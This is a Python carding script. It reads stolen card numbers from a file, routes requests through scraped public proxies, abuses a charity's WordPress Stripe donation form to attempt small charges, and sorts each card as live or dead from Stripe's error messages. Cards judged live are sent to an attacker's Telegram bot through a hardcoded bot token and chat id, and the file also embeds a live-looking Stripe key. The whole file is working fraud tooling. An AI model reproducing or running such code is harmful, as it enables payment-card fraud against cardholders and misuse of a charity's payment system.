import requests, os, re, urllib3, time, string, random
from bs4 import BeautifulSoup
urllib3.disable_warnings()

regex_html_tag = re.compile(r'<[^>]+>')

def remove_tags(text):
    return regex_html_tag.sub('', text)




    
bot_token="5935678255:AAH4yHqwVwwiARYe-DV5I3ffTalWo22Ghrg"
chat_id="2105574691"
def sendIP(cc):
    requests.get(f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text="+cc)
    
def getProxy(html):
    return re.findall("\\d{1,3}(?:\\.\\d{1,3}){3}(?::\\d{1,5})?", html)

def sendRequest():
    h= {
    "Host": "www.sslproxies.org",
    "sec-ch-ua": "\"Not?A_Brand\";v\u003d\"8\", \"Chromium\";v\u003d\"108\", \"Google Chrome\";v\u003d\"108\"",
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": "\"Android\"",
    "dnt": "1",
    "upgrade-insecure-requests": "1",
    "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36",
    "accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/avif,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.9",
    "sec-fetch-site": "none",
    "sec-fetch-mode": "navigate",
    "sec-fetch-user": "?1",
    "sec-fetch-dest": "document",
    "accept-language": "en-IN,en-GB;q\u003d0.9,en-US;q\u003d0.8,en;q\u003d0.7"
    }
    req=requests.get("https://www.sslproxies.org/", headers=h, verify=False).text 
    return req

def getHTTPProxy():
    proxies=getProxy(sendRequest())
    ok=[]
    for proxy in proxies:
        if len(proxy.split(":"))==2:
           # print(proxy)
            ok.append(proxy)
    ip=ok[0].split(":")[0]
    return {"http"  : "http://"+ok[0]}, ip



def chk(cc, mon, year, cvv, secKey, charge="5"):
    start_time = time.perf_counter ()
    amt="100"
    proxy, ip=getHTTPProxy()
    h1= {
    "Host": "neetzotz.org",
    "sec-ch-ua": "\"Not?A_Brand\";v\u003d\"8\", \"Chromium\";v\u003d\"108\", \"Google Chrome\";v\u003d\"108\"",
    "dnt": "1",
    "sec-ch-ua-mobile": "?1",
    "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36",
    "content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8",
    "accept": "application/json, text/javascript, */*; q\u003d0.01",
    "x-requested-with": "XMLHttpRequest",
    "sec-ch-ua-platform": "\"Android\"",
    "origin": "https://neetzotz.org",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://neetzotz.org/stripe-payment/",
    "accept-language": "en-IN,en-GB;q\u003d0.9,en-US;q\u003d0.8,en;q\u003d0.7,hi;q\u003d0.6"
    }
    html_text=requests.get("https://neetzotz.org/stripe-payment/", headers=h1, proxies=proxy).text
    data = re.findall(r'var wpsdAdminScriptObj = (.*?);', html_text)[0]
    secKey=eval(data).get("security")
    h2=h1
    d2=f"action=wpsd_donation&name=Charlie+D.+Puth&email=tizi.esc%40gmail.com&amount={charge}&donation_for=Charity&currency=GBP&idempotency=R42ismdJ&security={secKey}&stripeSdk="
    req2=requests.post("https://neetzotz.org/wp-admin/admin-ajax.php", headers=h2, data=d2, proxies=proxy, verify=False)
   # print(req2.text)
    
    piID=req2.json().get("data").get("client_secret")
    if piID:
        pass
    else:
        return "ERROR: PI ID NOT FOUND ~ IP: "+ip
    piID2="pi_"+piID.split("_")[1]
    h3={
    "Host": "api.stripe.com",
    "sec-ch-ua": "\"Not?A_Brand\";v\u003d\"8\", \"Chromium\";v\u003d\"108\", \"Google Chrome\";v\u003d\"108\"",
    "accept": "application/json",
    "content-type": "application/x-www-form-urlencoded",
    "dnt": "1",
    "sec-ch-ua-mobile": "?1",
    "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36",
    "sec-ch-ua-platform": "\"Android\"",
    "origin": "https://js.stripe.com",
    "sec-fetch-site": "same-site",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://js.stripe.com/",
    "accept-language": "en-IN,en-GB;q\u003d0.9,en-US;q\u003d0.8,en;q\u003d0.7,hi;q\u003d0.6"
    }
    
   
    d3=f"payment_method_data[type]=card&payment_method_data[billing_details][name]=Charlie+D.+Puth&payment_method_data[billing_details][email]=tizi.esc%40gmail.com&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_month]={mon}&payment_method_data[card][exp_year]={year}&payment_method_data[guid]=NA&payment_method_data[muid]=NA&payment_method_data[sid]=NA&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F99e8a7e982%3B+stripe-js-v3%2F99e8a7e982&payment_method_data[time_on_page]=33467&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_YCfdFgqPeaDD7o5xANRAPQ8y00dmsEk6Mt&client_secret={piID}"
    req3=requests.post(f"https://api.stripe.com/v1/payment_intents/{piID2}/confirm", headers=h3, data=d3, proxies=proxy, verify=False)
    #print(req3)
    
    if req3.status_code==402:
        msg=req3.json()["error"]["message"]
        end_time = time.perf_counter()
        takenTime=str(end_time - start_time)[:4]+"s"
        if "Your card's security code is incorrect." in req3.text:
            return f"LIVE ~ CCN~ MSG: {msg} ~ IP: {ip} ~ Time Taken: {takenTime}"
        elif "Your card has insufficient funds." in req3.text:
            return f"LIVE ~ CVV~ MSG: {msg} ~ IP: {ip} ~ Time Taken: {takenTime}"
        return f"DEAD ~ MSG: {msg} ~ IP: {ip} ~ Time Taken: {takenTime}"
    elif req3.status_code==200:
        return f"LIVE ~ MSG: Success ~ CHARGED ${charge}~ IP: {ip} ~ Time Taken: {takenTime}"
    else:
        return f"DEAD ~ IP: {ip} ~ Time Taken: {takenTime}"


def readFile(filename):
    s=""
    with open(filename, "r") as f:
        tmp=f.readlines()
        for u in tmp:
            s=s+u
    return s.split("\n")

def main():
    f=input("Enter File Name:  ")
    CCS=readFile(f)
    secKey=None
    if secKey==None:
        h1= {
        "Host": "neetzotz.org",
        "sec-ch-ua": "\"Not?A_Brand\";v\u003d\"8\", \"Chromium\";v\u003d\"108\", \"Google Chrome\";v\u003d\"108\"",
        "dnt": "1",
        "sec-ch-ua-mobile": "?1",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36",
        "content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8",
        "accept": "application/json, text/javascript, */*; q\u003d0.01",
        "x-requested-with": "XMLHttpRequest",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://neetzotz.org",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://neetzotz.org/stripe-payment/",
        "accept-language": "en-IN,en-GB;q\u003d0.9,en-US;q\u003d0.8,en;q\u003d0.7,hi;q\u003d0.6"
        }
        html_text=requests.get("https://neetzotz.org/stripe-payment/", headers=h1, proxies=None).text
        data = re.findall(r'var wpsdAdminScriptObj = (.*?);', html_text)[0]
        secKey=eval(data).get("security")
    for CC in CCS:
        
        
        try:
            temp=CC.split("|")
            ccn=temp[0]
            m=temp[1]
            y=temp[2]
            cvv=temp[3]
            msg=chk(ccn, m, y, cvv, secKey)
            if "LIVE" in msg:
                sendIP(msg)
            print(CC)
            print(msg)
            print()
        except KeyboardInterrupt:
            exit()
        except Exception as e:
            print("ERROR")
            print(e)
            pass
main()
